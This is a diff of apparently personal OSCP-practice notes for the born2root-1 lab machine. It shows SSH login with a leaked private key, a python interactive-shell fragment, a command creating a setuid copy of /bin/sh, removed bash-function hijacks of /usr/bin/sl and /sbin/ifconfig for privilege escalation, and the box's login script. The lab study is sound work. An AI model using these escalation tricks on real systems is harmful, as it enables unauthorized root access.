@@ -137,14 +137,13 @@ rlJ7dOFH7OFQbGp51ub88M1VOiXR6/fU8OMOkXfi1KkETj/xp6t+
 -----END RSA PRIVATE KEY-----
 
 
-└─$ ssh martin@192.168.110.6 -i /home/kali/OSCP/boxes/born2root-1/key
+└─$ ssh martin@192.168.110.14 -i key 
+sign_and_send_pubkey: no mutual signature supported
+martin@192.168.110.14's password: 
 
-└─$ ssh martin@192.168.110.6 -i /home/kali/OSCP/boxes/born2root-1/key
-The authenticity of host '192.168.110.6 (192.168.110.6)' can't be established.
-ED25519 key fingerprint is SHA256:y7AzR/QI4CJW3DLNEfBYopBbKkUP12PZv3vt+1ZQP6E.
-This key is not known by any other names
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '192.168.110.6' (ED25519) to the list of known hosts.
+
+┌──(kali㉿kali)-[~/OSCP/boxes/born2root-1]
+└─$ ssh martin@192.168.110.14 -i key    
 
 The programs included with the Debian GNU/Linux system are free software;
 the exact distribution terms for each program are described in the
@@ -158,6 +157,8 @@ READY TO ACCESS THE SECRET LAB ?
 
 secret password : 
 WELCOME ! 
+martin@debian:~$ 
+
 
 
 
@@ -194,11 +195,8 @@ p=subprocess.call(["/bin/sh","-i"])
 
 import os; os.system('cp /bin/sh /tmp/sh'); os.system('chmod 4755 /tmp/sh');
 
-bash-4.2$ function /usr/bin/sl () { /bin/bash; }
-bash-4.2$ export -f /usr/bin/sl
 
-function /sbin/ifconfig() { /bin/bash; }
-export -f /sbin/ifconfig
+
 
 
 
@@ -212,3 +210,27 @@ crunch
 
 
 # Boxe
+
+.bashrc
+```bash
+...
+/var/tmp/login.py
+```
+```python
+
+martin@debian:~$ cat /var/tmp/login.py
+#!/usr/bin/python
+
+import os
+
+print("")
+print("READY TO ACCESS THE SECRET LAB ? ")
+print("")
+password = raw_input("secret password : ")
+
+if (password) == "secretsec" or "secretlab" :
+        print("WELCOME ! ")
+else:
+        print("GET OUT ! ")
+        os.system("pkill -u 'martin'")
+```
